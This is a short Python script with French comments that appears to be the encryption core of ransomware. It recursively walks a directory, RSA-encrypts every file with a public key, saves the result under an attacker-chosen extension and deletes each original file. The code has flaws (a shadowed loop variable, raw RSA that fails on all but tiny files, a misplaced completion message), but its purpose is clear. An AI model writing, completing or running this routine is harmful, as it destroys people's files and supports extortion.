import os
import rsa

def encrypt_directory(directory_path, public_key, extension):
    print("")
    # Parcours de tous les fichiers du répertoire
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)

            # Lecture du fichier
            with open(file_path, 'rb') as file:
                data = file.read()
            try:
                # Chiffrement des données avec la clé publique
                encrypted_data = rsa.encrypt(data, public_key)
                # Écriture des données chiffrées dans un nouveau fichier
                dot_extension = "."+str(extension)
                encrypted_file_path = file_path + dot_extension
                with open(encrypted_file_path, 'wb') as file:
                    file.write(encrypted_data)
                print(f"Le fichier {file_path} a été chiffré avec succès.")
                os.remove(file_path)
                print("\nDirectory encryption completed.")
            except:
                print("Sorry, but the file is too big and we can't encrypt it or the file is already encrypted.")
    

